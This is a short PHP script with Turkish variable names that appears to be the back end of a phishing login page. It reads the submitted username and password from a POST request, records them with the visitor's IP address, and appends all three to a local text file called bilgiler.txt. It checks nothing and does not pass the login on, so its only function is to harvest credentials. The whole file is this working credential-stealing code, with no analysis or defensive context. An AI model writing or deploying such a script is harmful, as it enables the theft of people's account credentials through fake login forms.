<?php 
//$site = "http://icanhazip.com/";
$kullaniciadi = $_POST['Username'];
$sifre = $_POST['Password'];
$ip =$_SERVER["REMOTE_ADDR"];

$dosya = fopen ("bilgiler.txt" , 'a'); 
$yaz="Username:  ". $kullaniciadi . "   Password: " .$sifre."   IP: ".$ip;
fwrite ( $dosya , $yaz ) ;
fclose ($dosya);



 ?>